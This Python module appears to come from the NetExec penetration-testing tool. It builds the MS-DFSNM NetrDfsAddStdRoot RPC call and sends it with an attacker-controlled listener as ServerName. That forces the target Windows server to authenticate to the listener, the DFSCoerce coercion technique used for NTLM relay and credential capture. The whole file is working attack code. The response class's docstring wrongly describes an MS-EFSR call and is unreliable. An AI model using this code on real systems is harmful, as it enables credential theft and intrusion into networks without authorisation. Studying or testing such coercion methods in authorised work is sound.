from impacket.dcerpc.v5.ndr import NDRCALL
from impacket.dcerpc.v5.dtypes import WSTR, DWORD

from nxc.data.coercer_method.DCERPCSessionError import DCERPCSessionError

class NetrDfsAddStdRoot(NDRCALL):
    """Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol"""
    opnum = 12
    structure = (
        ("ServerName", WSTR),  # Type: WCHAR *
        ("RootShare", WSTR),   # Type: WCHAR *
        ("Comment", WSTR),     # Type: WCHAR *
        ("ApiFlags", DWORD),   # Type: DWORD
    )


class NetrDfsAddStdRootResponse(NDRCALL):
    """Structure to parse the response of the RPC call to EfsRpcRemoveUsersFromFile() in [MS-EFSR Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31)"""
    structure = ()


def request(dce, target, listener):
    request = NetrDfsAddStdRoot()
    request["ServerName"] = f"{listener}\x00"
    request["RootShare"] = "test\x00"
    request["Comment"] = "lodos\x00"
    request["ApiFlags"] = 0
    dce.request(request)